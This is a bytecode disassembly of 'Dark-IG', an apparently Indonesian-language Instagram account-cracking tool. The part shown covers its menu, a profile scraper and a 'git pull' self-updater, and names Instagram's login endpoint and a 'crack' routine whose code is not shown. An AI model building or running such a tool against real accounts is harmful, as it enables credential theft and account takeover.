@@ -1,0 +1,1745 @@
+  ## inspecting pyc file ##
+filename:     4.pyc
+magic number: 0x(03 f3 0d 0a)
+timestamp:    1519539947 (Sun Feb 25 13:25:47 2018)
+code
+   co_argcount:        0
+   co_cellvars:        ()
+   co_filename:        '<script>'
+   co_firstlineno:     2
+   co_flags:           0x00040
+   co_freevars:        ()
+   co_lnotab:          "$\x01\x0c\x01\x10\x01\x10\x01\x0c\x01\x03\x01\x10\x01\r\x01\r\x01\x0c\x01\x0c\x01\x05\x01\x10\x01\x0c\x01\r\x01\n\x01\x0c\x01\r\x01\n\x01\x0c\x01\x10\x01\x0c\x01\x10\x02\x05\x01\r\x01\x11\x03\x06\x01\n\x01\x0c\x01\x03\x01\r\x01\x17\x01\x10\x03\t\x07\t\x12\x06\x02\x06\x01\x06\x01\x06\x01\x06\x01\x06\x03\t\x0c\t\x1c\t$\t.\t\r\t'\x0c\x01"
+   co_name:            '<module>'
+   co_names:           ('os', 'sys', 'time', 'urllib', 'urlopen', 'buka', 'bs4', 'BeautifulSoup', 'soup', 'json', 'requests', 'ImportError', 'system', 'raw_input', 'rqs', 'exit', 'sleep', 'base', 'url', 'Session', 'session', 'headers', 'update', 'requests.exceptions', 'ConnectionError', 'jalan', 'keluar', 'logo', 'back', 'berhasil', 'gagal', 'name', 'has', 'menu', 'chose', 'informasi', 'crack', 'hasil', 'search', '__name__')
+   co_nlocals:         0
+   co_stacksize:       5
+   co_varnames:        ()
+   co_consts
+      0 -1
+      1 None
+      2 ('urlopen',)
+      3 ('BeautifulSoup',)
+      4 'reset'
+      5 '\x1b[1;91m[+] \x1b[1;92mPerlu install requests \x1b[1;97m(y/t): '
+      6 ''
+      7 '\x1b[1;91m[!] Jangan kosong'
+      8 'y'
+      9 'pip2 install requests'
+      10 'Y'
+      11 't'
+      12 'T'
+      13 '\x1b[1;91m[!]\x1b[1;92m Pilih\x1b[1;93m (y/n)'
+      14 1
+      15 'https://www.instagram.com/'
+      16 'accounts/login/ajax/'
+      17 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36'
+      18 'user-agent'
+      19 'Referer'
+      20 ('ConnectionError',)
+      21 (code object)
+         co_argcount:        1
+         co_cellvars:        ()
+         co_filename:        '<script>'
+         co_firstlineno:     40
+         co_flags:           0x00043
+         co_freevars:        ()
+         co_lnotab:          '\x00\x01\x11\x01\x10\x01\r\x01'
+         co_name:            'jalan'
+         co_names:           ('sys', 'stdout', 'write', 'flush', 'time', 'sleep')
+         co_nlocals:         2
+         co_stacksize:       3
+         co_varnames:        ('z', 'e')
+         co_consts
+            0 None
+            1 '\n'
+            2 0.1
+         co_code
+            78 3c 00 7c 00 00 64 01 00 17 44 5d 30 00 7d 01
+            00 74 00 00 6a 01 00 6a 02 00 7c 01 00 83 01 00
+            01 74 00 00 6a 01 00 6a 03 00 83 00 00 01 74 04
+            00 6a 05 00 64 02 00 83 01 00 01 71 0b 00 57 64
+            00 00 53
+            disassembled:
+             41           0 SETUP_LOOP              60 (to 63)
+                          3 LOAD_FAST                0 (z)
+                          6 LOAD_CONST               1 ('\n')
+                          9 BINARY_ADD          
+                         10 GET_ITER            
+                    >>   11 FOR_ITER                48 (to 62)
+                         14 STORE_FAST               1 (e)
+            
+             42          17 LOAD_GLOBAL              0 (sys)
+                         20 LOAD_ATTR                1 (stdout)
+                         23 LOAD_ATTR                2 (write)
+                         26 LOAD_FAST                1 (e)
+                         29 CALL_FUNCTION            1
+                         32 POP_TOP             
+            
+             43          33 LOAD_GLOBAL              0 (sys)
+                         36 LOAD_ATTR                1 (stdout)
+                         39 LOAD_ATTR                3 (flush)
+                         42 CALL_FUNCTION            0
+                         45 POP_TOP             
+            
+             44          46 LOAD_GLOBAL              4 (time)
+                         49 LOAD_ATTR                5 (sleep)
+                         52 LOAD_CONST               2 (0.1)
+                         55 CALL_FUNCTION            1
+                         58 POP_TOP             
+                         59 JUMP_ABSOLUTE           11
+                    >>   62 POP_BLOCK           
+                    >>   63 LOAD_CONST               0 (None)
+                         66 RETURN_VALUE        
+            
+      22 (code object)
+         co_argcount:        0
+         co_cellvars:        ()
+         co_filename:        '<script>'
+         co_firstlineno:     47
+         co_flags:           0x00043
+         co_freevars:        ()
+         co_lnotab:          '\x00\x01\x05\x01'
+         co_name:            'keluar'
+         co_names:           ('os', 'sys', 'exit')
+         co_nlocals:         0
+         co_stacksize:       1
+         co_varnames:        ()
+         co_consts
+            0 None
+            1 '\x1b[1;91m[!] Keluar'
+         co_code
+            64 01 00 47 48 74 00 00 6a 01 00 6a 02 00 83 00
+            00 01 64 00 00 53
+            disassembled:
+             48           0 LOAD_CONST               1 ('\x1b[1;91m[!] Keluar')
+                          3 PRINT_ITEM          
+                          4 PRINT_NEWLINE       
+            
+             49           5 LOAD_GLOBAL              0 (os)
+                          8 LOAD_ATTR                1 (sys)
+                         11 LOAD_ATTR                2 (exit)
+                         14 CALL_FUNCTION            0
+                         17 POP_TOP             
+                         18 LOAD_CONST               0 (None)
+                         21 RETURN_VALUE        
+            
+      23 "\x1b[1;97m\n ___    ___\n( _<    >_ )\n//        \\\\\n\\\\___\x1b[1;91m..\x1b[1;97m___//               \x1b[1;92m[\x1b[1;97mDark-IG\x1b[1;92m]\x1b[1;93mv0.1\x1b[1;97m\n `-(    )-'\n   _|__|_   \x1b[1;93m* \x1b[1;97mAuthor  \x1b[1;91m: \x1b[1;96mZeDD\x1b[1;97m\n  /_|__|_\\  \x1b[1;93m* \x1b[1;97mSupport \x1b[1;91m: \x1b[1;96mLimite\x1b[1;97m[\x1b[1;96mD\x1b[1;97m] \x1b[1;97m/ \x1b[1;96m./R41N53 \x1b[1;97m/ \x1b[1;96mAl2VyN\x1b[1;97m\n  /_|__|_\\  \x1b[1;93m* \x1b[1;97mGitHub  \x1b[1;91m: \x1b[1;92m\x1b[4mhttps://github.com/rezadkim\x1b[0m\x1b[1;97m\n  /_\\__/_\\  =========================================\n   \\ || /  _)\n     ||   ( )\n     \\\\___//\n      `---' "
+      24 0
+      25 (code object)
+         co_argcount:        0
+         co_cellvars:        ()
+         co_filename:        '<script>'
+         co_firstlineno:     74
+         co_flags:           0x00043
+         co_freevars:        ()
+         co_lnotab:          '\x00\x01\r\x01\x05\x01\t\x01\x05\x01\x05\x01\x05\x01\x05\x01\x05\x01\t\x01'
+         co_name:            'menu'
+         co_names:           ('os', 'system', 'logo', 'chose')
+         co_nlocals:         0
+         co_stacksize:       2
+         co_varnames:        ()
+         co_consts
+            0 None
+            1 'reset'
+            2 30
+            3 '\x1b[1;97m='
+            4 '\x1b[1;91m1.\x1b[1;97m Lihat informasi Username'
+            5 '\x1b[1;91m2.\x1b[1;97m Crack'
+            6 '\x1b[1;91m3.\x1b[1;97m Ambil Username'
+            7 '\x1b[1;91m4.\x1b[1;97m Update'
+            8 '\x1b[1;91m0. Keluar'
+            9 '\x1b[1;97m-'
+         co_code
+            74 00 00 6a 01 00 64 01 00 83 01 00 01 74 02 00
+            47 48 64 02 00 64 03 00 14 47 48 64 04 00 47 48
+            64 05 00 47 48 64 06 00 47 48 64 07 00 47 48 64
+            08 00 47 48 64 02 00 64 09 00 14 47 48 74 03 00
+            83 00 00 01 64 00 00 53
+            disassembled:
+             75           0 LOAD_GLOBAL              0 (os)
+                          3 LOAD_ATTR                1 (system)
+                          6 LOAD_CONST               1 ('reset')
+                          9 CALL_FUNCTION            1
+                         12 POP_TOP             
+            
+             76          13 LOAD_GLOBAL              2 (logo)
+                         16 PRINT_ITEM          
+                         17 PRINT_NEWLINE       
+            
+             77          18 LOAD_CONST               2 (30)
+                         21 LOAD_CONST               3 ('\x1b[1;97m=')
+                         24 BINARY_MULTIPLY     
+                         25 PRINT_ITEM          
+                         26 PRINT_NEWLINE       
+            
+             78          27 LOAD_CONST               4 ('\x1b[1;91m1.\x1b[1;97m Lihat informasi Username')
+                         30 PRINT_ITEM          
+                         31 PRINT_NEWLINE       
+            
+             79          32 LOAD_CONST               5 ('\x1b[1;91m2.\x1b[1;97m Crack')
+                         35 PRINT_ITEM          
+                         36 PRINT_NEWLINE       
+            
+             80          37 LOAD_CONST               6 ('\x1b[1;91m3.\x1b[1;97m Ambil Username')
+                         40 PRINT_ITEM          
+                         41 PRINT_NEWLINE       
+            
+             81          42 LOAD_CONST               7 ('\x1b[1;91m4.\x1b[1;97m Update')
+                         45 PRINT_ITEM          
+                         46 PRINT_NEWLINE       
+            
+             82          47 LOAD_CONST               8 ('\x1b[1;91m0. Keluar')
+                         50 PRINT_ITEM          
+                         51 PRINT_NEWLINE       
+            
+             83          52 LOAD_CONST               2 (30)
+                         55 LOAD_CONST               9 ('\x1b[1;97m-')
+                         58 BINARY_MULTIPLY     
+                         59 PRINT_ITEM          
+                         60 PRINT_NEWLINE       
+            
+             84          61 LOAD_GLOBAL              3 (chose)
+                         64 CALL_FUNCTION            0
+                         67 POP_TOP             
+                         68 LOAD_CONST               0 (None)
+                         71 RETURN_VALUE        
+            
+      26 (code object)
+         co_argcount:        0
+         co_cellvars:        ()
+         co_filename:        '<script>'
+         co_firstlineno:     86
+         co_flags:           0x00043
+         co_freevars:        ()
+         co_lnotab:          '\x00\x01\x0c\x01\x0c\x01\x05\x01\n\x01\x0c\x01\n\x01\x0c\x01\x07\x01\n\x01\x0c\x01\n\x01\x0c\x01\n\x01\x12\x01\xa2\x01\r\x01\x10\x02\x05\x01\n\x01\x0c\x01\n\x02\r\x01'
+         co_name:            'chose'
+         co_names:           ('raw_input', 'chose', 'informasi', 'crack', 'hasil', 'search', 'jalan', 'requests', 'get', 'text', 'str', 'os', 'system', 'keluar')
+         co_nlocals:         2
+         co_stacksize:       3
+         co_varnames:        ('pilih', 'r')
+         co_consts
+            0 None
+            1 '\x1b[1;91mPilih\x1b[1;97m : '
+            2 ''
+            3 '\x1b[1;91m[!] Jangan kosong'
+            4 '1'
+            5 '2'
+            6 '3'
+            7 '4'
+            8 '\x1b[1;91m[!] \x1b[1;92mMemeriksa update \x1b[1;97m...'
+            9 'https://raw.githubusercontent.com/rezadkim/dark-ig/master/README.md'
+            10 'v0.2'
+            11 'v0.3'
+            12 'v0.4'
+            13 'v0.5'
+            14 'v0.6'
+            15 'v0.7'
+            16 'v0.8'
+            17 'v0.9'
+            18 'v1.1'
+            19 'git pull'
+            20 'python2 ig.py'
+            21 '\x1b[1;91m[!] Belum ada versi terbaru'
+            22 '0'
+            23 '\x1b[1;91m[!] \x1b[1;97m'
+            24 ' \x1b[1;91mTidak ada'
+         co_code
+            74 00 00 64 01 00 83 01 00 7d 00 00 7c 00 00 64
+            02 00 6b 02 00 72 27 00 64 03 00 47 48 74 01 00
+            83 00 00 01 6e 69 01 7c 00 00 64 04 00 6b 02 00
+            72 3d 00 74 02 00 83 00 00 01 6e 53 01 7c 00 00
+            64 05 00 6b 02 00 72 5a 00 74 03 00 83 00 00 01
+            74 04 00 83 00 00 01 6e 36 01 7c 00 00 64 06 00
+            6b 02 00 72 70 00 74 05 00 83 00 00 01 6e 20 01
+            7c 00 00 64 07 00 6b 02 00 72 66 01 74 06 00 64
+            08 00 83 01 00 01 74 07 00 6a 08 00 64 09 00 83
+            01 00 6a 09 00 7d 01 00 64 0a 00 74 0a 00 7c 01
+            00 83 01 00 6b 06 00 73 3a 01 64 0b 00 74 0a 00
+            7c 01 00 83 01 00 6b 06 00 73 3a 01 64 0c 00 74
+            0a 00 7c 01 00 83 01 00 6b 06 00 73 3a 01 64 0d
+            00 74 0a 00 7c 01 00 83 01 00 6b 06 00 73 3a 01
+            64 0e 00 74 0a 00 7c 01 00 83 01 00 6b 06 00 73
+            3a 01 64 0f 00 74 0a 00 7c 01 00 83 01 00 6b 06
+            00 73 3a 01 64 10 00 74 0a 00 7c 01 00 83 01 00
+            6b 06 00 73 3a 01 64 11 00 74 0a 00 7c 01 00 83
+            01 00 6b 06 00 73 3a 01 64 12 00 74 0a 00 7c 01
+            00 83 01 00 6b 06 00 72 57 01 74 0b 00 6a 0c 00
+            64 13 00 83 01 00 01 74 0b 00 6a 0c 00 64 14 00
+            83 01 00 01 71 90 01 64 15 00 47 48 74 0d 00 83
+            00 00 01 6e 2a 00 7c 00 00 64 16 00 6b 02 00 72
+            7c 01 74 0d 00 83 00 00 01 6e 14 00 64 17 00 7c
+            00 00 17 64 18 00 17 47 48 74 01 00 83 00 00 01
+            64 00 00 53
+            disassembled:
+             87           0 LOAD_GLOBAL              0 (raw_input)
+                          3 LOAD_CONST               1 ('\x1b[1;91mPilih\x1b[1;97m : ')
+                          6 CALL_FUNCTION            1
+                          9 STORE_FAST               0 (pilih)
+            
+             88          12 LOAD_FAST                0 (pilih)
+                         15 LOAD_CONST               2 ('')
+                         18 COMPARE_OP               2 (==)
+                         21 POP_JUMP_IF_FALSE       39
+            
+             89          24 LOAD_CONST               3 ('\x1b[1;91m[!] Jangan kosong')
+                         27 PRINT_ITEM          
+                         28 PRINT_NEWLINE       
+            
+             90          29 LOAD_GLOBAL              1 (chose)
+                         32 CALL_FUNCTION            0
+                         35 POP_TOP             
+                         36 JUMP_FORWARD           361 (to 400)
+            
+             91     >>   39 LOAD_FAST                0 (pilih)
+                         42 LOAD_CONST               4 ('1')
+                         45 COMPARE_OP               2 (==)
+                         48 POP_JUMP_IF_FALSE       61
+            
+             92          51 LOAD_GLOBAL              2 (informasi)
+                         54 CALL_FUNCTION            0
+                         57 POP_TOP             
+                         58 JUMP_FORWARD           339 (to 400)
+            
+             93     >>   61 LOAD_FAST                0 (pilih)
+                         64 LOAD_CONST               5 ('2')
+                         67 COMPARE_OP               2 (==)
+                         70 POP_JUMP_IF_FALSE       90
+            
+             94          73 LOAD_GLOBAL              3 (crack)
+                         76 CALL_FUNCTION            0
+                         79 POP_TOP             
+            
+             95          80 LOAD_GLOBAL              4 (hasil)
+                         83 CALL_FUNCTION            0
+                         86 POP_TOP             
+                         87 JUMP_FORWARD           310 (to 400)
+            
+             96     >>   90 LOAD_FAST                0 (pilih)
+                         93 LOAD_CONST               6 ('3')
+                         96 COMPARE_OP               2 (==)
+                         99 POP_JUMP_IF_FALSE      112
+            
+             97         102 LOAD_GLOBAL              5 (search)
+                        105 CALL_FUNCTION            0
+                        108 POP_TOP             
+                        109 JUMP_FORWARD           288 (to 400)
+            
+             98     >>  112 LOAD_FAST                0 (pilih)
+                        115 LOAD_CONST               7 ('4')
+                        118 COMPARE_OP               2 (==)
+                        121 POP_JUMP_IF_FALSE      358
+            
+             99         124 LOAD_GLOBAL              6 (jalan)
+                        127 LOAD_CONST               8 ('\x1b[1;91m[!] \x1b[1;92mMemeriksa update \x1b[1;97m...')
+                        130 CALL_FUNCTION            1
+                        133 POP_TOP             
+            
+            100         134 LOAD_GLOBAL              7 (requests)
+                        137 LOAD_ATTR                8 (get)
+                        140 LOAD_CONST               9 ('https://raw.githubusercontent.com/rezadkim/dark-ig/master/README.md')
+                        143 CALL_FUNCTION            1
+                        146 LOAD_ATTR                9 (text)
+                        149 STORE_FAST               1 (r)
+            
+            101         152 LOAD_CONST              10 ('v0.2')
+                        155 LOAD_GLOBAL             10 (str)
+                        158 LOAD_FAST                1 (r)
+                        161 CALL_FUNCTION            1
+                        164 COMPARE_OP               6 (in)
+                        167 POP_JUMP_IF_TRUE       314
+                        170 LOAD_CONST              11 ('v0.3')
+                        173 LOAD_GLOBAL             10 (str)
+                        176 LOAD_FAST                1 (r)
+                        179 CALL_FUNCTION            1
+                        182 COMPARE_OP               6 (in)
+                        185 POP_JUMP_IF_TRUE       314
+                        188 LOAD_CONST              12 ('v0.4')
+                        191 LOAD_GLOBAL             10 (str)
+                        194 LOAD_FAST                1 (r)
+                        197 CALL_FUNCTION            1
+                        200 COMPARE_OP               6 (in)
+                        203 POP_JUMP_IF_TRUE       314
+                        206 LOAD_CONST              13 ('v0.5')
+                        209 LOAD_GLOBAL             10 (str)
+                        212 LOAD_FAST                1 (r)
+                        215 CALL_FUNCTION            1
+                        218 COMPARE_OP               6 (in)
+                        221 POP_JUMP_IF_TRUE       314
+                        224 LOAD_CONST              14 ('v0.6')
+                        227 LOAD_GLOBAL             10 (str)
+                        230 LOAD_FAST                1 (r)
+                        233 CALL_FUNCTION            1
+                        236 COMPARE_OP               6 (in)
+                        239 POP_JUMP_IF_TRUE       314
+                        242 LOAD_CONST              15 ('v0.7')
+                        245 LOAD_GLOBAL             10 (str)
+                        248 LOAD_FAST                1 (r)
+                        251 CALL_FUNCTION            1
+                        254 COMPARE_OP               6 (in)
+                        257 POP_JUMP_IF_TRUE       314
+                        260 LOAD_CONST              16 ('v0.8')
+                        263 LOAD_GLOBAL             10 (str)
+                        266 LOAD_FAST                1 (r)
+                        269 CALL_FUNCTION            1
+                        272 COMPARE_OP               6 (in)
+                        275 POP_JUMP_IF_TRUE       314
+                        278 LOAD_CONST              17 ('v0.9')
+                        281 LOAD_GLOBAL             10 (str)
+                        284 LOAD_FAST                1 (r)
+                        287 CALL_FUNCTION            1
+                        290 COMPARE_OP               6 (in)
+                        293 POP_JUMP_IF_TRUE       314
+                        296 LOAD_CONST              18 ('v1.1')
+                        299 LOAD_GLOBAL             10 (str)
+                        302 LOAD_FAST                1 (r)
+                        305 CALL_FUNCTION            1
+                        308 COMPARE_OP               6 (in)
+                        311 POP_JUMP_IF_FALSE      343
+            
+            102     >>  314 LOAD_GLOBAL             11 (os)
+                        317 LOAD_ATTR               12 (system)
+                        320 LOAD_CONST              19 ('git pull')
+                        323 CALL_FUNCTION            1
+                        326 POP_TOP             
+            
+            103         327 LOAD_GLOBAL             11 (os)
+                        330 LOAD_ATTR               12 (system)
+                        333 LOAD_CONST              20 ('python2 ig.py')
+                        336 CALL_FUNCTION            1
+                        339 POP_TOP             
+                        340 JUMP_ABSOLUTE          400
+            
+            105     >>  343 LOAD_CONST              21 ('\x1b[1;91m[!] Belum ada versi terbaru')
+                        346 PRINT_ITEM          
+                        347 PRINT_NEWLINE       
+            
+            106         348 LOAD_GLOBAL             13 (keluar)
+                        351 CALL_FUNCTION            0
+                        354 POP_TOP             
+                        355 JUMP_FORWARD            42 (to 400)
+            
+            107     >>  358 LOAD_FAST                0 (pilih)
+                        361 LOAD_CONST              22 ('0')
+                        364 COMPARE_OP               2 (==)
+                        367 POP_JUMP_IF_FALSE      380
+            
+            108         370 LOAD_GLOBAL             13 (keluar)
+                        373 CALL_FUNCTION            0
+                        376 POP_TOP             
+                        377 JUMP_FORWARD            20 (to 400)
+            
+            110     >>  380 LOAD_CONST              23 ('\x1b[1;91m[!] \x1b[1;97m')
+                        383 LOAD_FAST                0 (pilih)
+                        386 BINARY_ADD          
+                        387 LOAD_CONST              24 (' \x1b[1;91mTidak ada')
+                        390 BINARY_ADD          
+                        391 PRINT_ITEM          
+                        392 PRINT_NEWLINE       
+            
+            111         393 LOAD_GLOBAL              1 (chose)
+                        396 CALL_FUNCTION            0
+                        399 POP_TOP             
+                    >>  400 LOAD_CONST               0 (None)
+                        403 RETURN_VALUE        
+            
+      27 (code object)
+         co_argcount:        0
+         co_cellvars:        ()
+         co_filename:        '<script>'
+         co_firstlineno:     114
+         co_flags:           0x00043
+         co_freevars:        ()
+         co_lnotab:          '\x00\x01\r\x01\x05\x01\t\x01\x03\x01\x0c\x01\n\x01\t\x01\n\x01\x0f\x01\x12\x01\x1c\x01\x19\x01\n\x01\n\x01\n\x01\x06\x01\n\x01\n\x01\x0e\x01\x13\x01\x05\x01\n\x01\x13\x01\x05\x01\n\x01\x0b\x01\t\x01\t\x01\t\x01\t\x01\x05\x01\n\x01'
+         co_name:            'informasi'
+         co_names:           ('os', 'system', 'logo', 'raw_input', 'jalan', 'requests', 'get', 'soup', 'content', 'find_all', 'split', 'exceptions', 'ConnectionError', 'keluar', 'KeyError', 'IndexError', 'menu')
+         co_nlocals:         10
+         co_stacksize:       6
+         co_varnames:        ('usr', 'url', 'r', 'sayur', 'data', 'text', 'pengikut', 'ikuti', 'postingan', 'info')
+         co_consts
+            0 None
+            1 'reset'
+            2 30
+            3 '\x1b[1;97m='
+            4 '\x1b[1;91m[+] \x1b[1;32mUsername \x1b[1;91m:\x1b[1;97m '
+            5 '\x1b[1;91m[+] \x1b[1;92mTunggu sebentar\x1b[1;97m ...'
+            6 'https://www.instagram.com/'
+            7 'html.parser'
+            8 'meta'
+            9 'attrs'
+            10 'og:description'
+            11 'property'
+            12 0
+            13 'content'
+            14 2
+            15 4
+            16 'Followers'
+            17 'Following'
+            18 'Posts'
+            19 '\x1b[1;91m[!] Tidak ada koneksi'
+            20 '\x1b[1;91m[!] User tidak ditemukan'
+            21 '\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]'
+            22 '\x1b[1;91m[?] \x1b[1;92mPengguna  \x1b[1;97m: @'
+            23 '\x1b[1;91m[?] \x1b[1;92mPengikut  \x1b[1;97m: '
+            24 '\x1b[1;91m[?] \x1b[1;92mDi ikuti  \x1b[1;97m: '
+            25 '\x1b[1;91m[?] \x1b[1;92mPostingan \x1b[1;97m: '
+            26 '\x1b[1;91m[?] \x1b[1;92mPassword  \x1b[1;97m: Gatau goblok'
+         co_code
+            74 00 00 6a 01 00 64 01 00 83 01 00 01 74 02 00
+            47 48 64 02 00 64 03 00 14 47 48 79 c5 00 74 03
+            00 64 04 00 83 01 00 7d 00 00 74 04 00 64 05 00
+            83 01 00 01 64 02 00 64 03 00 14 47 48 64 06 00
+            7c 00 00 17 7d 01 00 74 05 00 6a 06 00 7c 01 00
+            83 01 00 7d 02 00 74 07 00 7c 02 00 6a 08 00 64
+            07 00 83 02 00 7d 03 00 7c 03 00 6a 09 00 64 08
+            00 64 09 00 69 01 00 64 0a 00 64 0b 00 36 83 01
+            01 7d 04 00 7c 04 00 64 0c 00 19 6a 06 00 64 0d
+            00 83 01 00 6a 0a 00 83 00 00 7d 05 00 7c 05 00
+            64 0c 00 19 7d 06 00 7c 05 00 64 0e 00 19 7d 07
+            00 7c 05 00 64 0f 00 19 7d 08 00 69 00 00 7d 09
+            00 7c 06 00 7c 09 00 64 10 00 3c 7c 07 00 7c 09
+            00 64 11 00 3c 7c 08 00 7c 09 00 64 12 00 3c 57
+            6e 4f 00 04 74 05 00 6a 0b 00 6a 0c 00 6b 0a 00
+            72 05 01 01 01 01 64 13 00 47 48 74 0d 00 83 00
+            00 01 6e 2d 00 04 74 0e 00 74 0f 00 66 02 00 6b
+            0a 00 72 31 01 01 01 01 64 14 00 47 48 74 03 00
+            64 15 00 83 01 00 01 74 10 00 83 00 00 01 6e 01
+            00 58 64 16 00 7c 00 00 17 47 48 64 17 00 7c 06
+            00 17 47 48 64 18 00 7c 07 00 17 47 48 64 19 00
+            7c 08 00 17 47 48 64 1a 00 47 48 74 03 00 64 15
+            00 83 01 00 01 74 10 00 83 00 00 01 64 00 00 53
+            disassembled:
+            115           0 LOAD_GLOBAL              0 (os)
+                          3 LOAD_ATTR                1 (system)
+                          6 LOAD_CONST               1 ('reset')
+                          9 CALL_FUNCTION            1
+                         12 POP_TOP             
+            
+            116          13 LOAD_GLOBAL              2 (logo)
+                         16 PRINT_ITEM          
+                         17 PRINT_NEWLINE       
+            
+            117          18 LOAD_CONST               2 (30)
+                         21 LOAD_CONST               3 ('\x1b[1;97m=')
+                         24 BINARY_MULTIPLY     
+                         25 PRINT_ITEM          
+                         26 PRINT_NEWLINE       
+            
+            118          27 SETUP_EXCEPT           197 (to 227)
+            
+            119          30 LOAD_GLOBAL              3 (raw_input)
+                         33 LOAD_CONST               4 ('\x1b[1;91m[+] \x1b[1;32mUsername \x1b[1;91m:\x1b[1;97m ')
+                         36 CALL_FUNCTION            1
+                         39 STORE_FAST               0 (usr)
+            
+            120          42 LOAD_GLOBAL              4 (jalan)
+                         45 LOAD_CONST               5 ('\x1b[1;91m[+] \x1b[1;92mTunggu sebentar\x1b[1;97m ...')
+                         48 CALL_FUNCTION            1
+                         51 POP_TOP             
+            
+            121          52 LOAD_CONST               2 (30)
+                         55 LOAD_CONST               3 ('\x1b[1;97m=')
+                         58 BINARY_MULTIPLY     
+                         59 PRINT_ITEM          
+                         60 PRINT_NEWLINE       
+            
+            122          61 LOAD_CONST               6 ('https://www.instagram.com/')
+                         64 LOAD_FAST                0 (usr)
+                         67 BINARY_ADD          
+                         68 STORE_FAST               1 (url)
+            
+            123          71 LOAD_GLOBAL              5 (requests)
+                         74 LOAD_ATTR                6 (get)
+                         77 LOAD_FAST                1 (url)
+                         80 CALL_FUNCTION            1
+                         83 STORE_FAST               2 (r)
+            
+            124          86 LOAD_GLOBAL              7 (soup)
+                         89 LOAD_FAST                2 (r)
+                         92 LOAD_ATTR                8 (content)
+                         95 LOAD_CONST               7 ('html.parser')
+                         98 CALL_FUNCTION            2
+                        101 STORE_FAST               3 (sayur)
+            
+            125         104 LOAD_FAST                3 (sayur)
+                        107 LOAD_ATTR                9 (find_all)
+                        110 LOAD_CONST               8 ('meta')
+                        113 LOAD_CONST               9 ('attrs')
+                        116 BUILD_MAP                1
+                        119 LOAD_CONST              10 ('og:description')
+                        122 LOAD_CONST              11 ('property')
+                        125 STORE_MAP           
+                        126 CALL_FUNCTION          257
+                        129 STORE_FAST               4 (data)
+            
+            126         132 LOAD_FAST                4 (data)
+                        135 LOAD_CONST              12 (0)
+                        138 BINARY_SUBSCR       
+                        139 LOAD_ATTR                6 (get)
+                        142 LOAD_CONST              13 ('content')
+                        145 CALL_FUNCTION            1
+                        148 LOAD_ATTR               10 (split)
+                        151 CALL_FUNCTION            0
+                        154 STORE_FAST               5 (text)
+            
+            127         157 LOAD_FAST                5 (text)
+                        160 LOAD_CONST              12 (0)
+                        163 BINARY_SUBSCR       
+                        164 STORE_FAST               6 (pengikut)
+            
+            128         167 LOAD_FAST                5 (text)
+                        170 LOAD_CONST              14 (2)
+                        173 BINARY_SUBSCR       
+                        174 STORE_FAST               7 (ikuti)
+            
+            129         177 LOAD_FAST                5 (text)
+                        180 LOAD_CONST              15 (4)
+                        183 BINARY_SUBSCR       
+                        184 STORE_FAST               8 (postingan)
+            
+            130         187 BUILD_MAP                0
+                        190 STORE_FAST               9 (info)
+            
+            131         193 LOAD_FAST                6 (pengikut)
+                        196 LOAD_FAST                9 (info)
+                        199 LOAD_CONST              16 ('Followers')
+                        202 STORE_SUBSCR        
+            
+            132         203 LOAD_FAST                7 (ikuti)
+                        206 LOAD_FAST                9 (info)
+                        209 LOAD_CONST              17 ('Following')
+                        212 STORE_SUBSCR        
+            
+            133         213 LOAD_FAST                8 (postingan)
+                        216 LOAD_FAST                9 (info)
+                        219 LOAD_CONST              18 ('Posts')
+                        222 STORE_SUBSCR        
+                        223 POP_BLOCK           
+                        224 JUMP_FORWARD            79 (to 306)
+            
+            134     >>  227 DUP_TOP             
+                        228 LOAD_GLOBAL              5 (requests)
+                        231 LOAD_ATTR               11 (exceptions)
+                        234 LOAD_ATTR               12 (ConnectionError)
+                        237 COMPARE_OP              10 (exception match)
+                        240 POP_JUMP_IF_FALSE      261
+                        243 POP_TOP             
+                        244 POP_TOP             
+                        245 POP_TOP             
+            
+            135         246 LOAD_CONST              19 ('\x1b[1;91m[!] Tidak ada koneksi')
+                        249 PRINT_ITEM          
+                        250 PRINT_NEWLINE       
+            
+            136         251 LOAD_GLOBAL             13 (keluar)
+                        254 CALL_FUNCTION            0
+                        257 POP_TOP             
+                        258 JUMP_FORWARD            45 (to 306)
+            
+            137     >>  261 DUP_TOP             
+                        262 LOAD_GLOBAL             14 (KeyError)
+                        265 LOAD_GLOBAL             15 (IndexError)
+                        268 BUILD_TUPLE              2
+                        271 COMPARE_OP              10 (exception match)
+                        274 POP_JUMP_IF_FALSE      305
+                        277 POP_TOP             
+                        278 POP_TOP             
+                        279 POP_TOP             
+            
+            138         280 LOAD_CONST              20 ('\x1b[1;91m[!] User tidak ditemukan')
+                        283 PRINT_ITEM          
+                        284 PRINT_NEWLINE       
+            
+            139         285 LOAD_GLOBAL              3 (raw_input)
+                        288 LOAD_CONST              21 ('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+                        291 CALL_FUNCTION            1
+                        294 POP_TOP             
+            
+            140         295 LOAD_GLOBAL             16 (menu)
+                        298 CALL_FUNCTION            0
+                        301 POP_TOP             
+                        302 JUMP_FORWARD             1 (to 306)
+                    >>  305 END_FINALLY         
+            
+            141     >>  306 LOAD_CONST              22 ('\x1b[1;91m[?] \x1b[1;92mPengguna  \x1b[1;97m: @')
+                        309 LOAD_FAST                0 (usr)
+                        312 BINARY_ADD          
+                        313 PRINT_ITEM          
+                        314 PRINT_NEWLINE       
+            
+            142         315 LOAD_CONST              23 ('\x1b[1;91m[?] \x1b[1;92mPengikut  \x1b[1;97m: ')
+                        318 LOAD_FAST                6 (pengikut)
+                        321 BINARY_ADD          
+                        322 PRINT_ITEM          
+                        323 PRINT_NEWLINE       
+            
+            143         324 LOAD_CONST              24 ('\x1b[1;91m[?] \x1b[1;92mDi ikuti  \x1b[1;97m: ')
+                        327 LOAD_FAST                7 (ikuti)
+                        330 BINARY_ADD          
+                        331 PRINT_ITEM          
+                        332 PRINT_NEWLINE       
+            
+            144         333 LOAD_CONST              25 ('\x1b[1;91m[?] \x1b[1;92mPostingan \x1b[1;97m: ')
+                        336 LOAD_FAST                8 (postingan)
+                        339 BINARY_ADD          
+                        340 PRINT_ITEM          
+                        341 PRINT_NEWLINE       
+            
+            145         342 LOAD_CONST              26 ('\x1b[1;91m[?] \x1b[1;92mPassword  \x1b[1;97m: Gatau goblok')
+                        345 PRINT_ITEM          
+                        346 PRINT_NEWLINE       
+            
+            146         347 LOAD_GLOBAL              3 (raw_input)
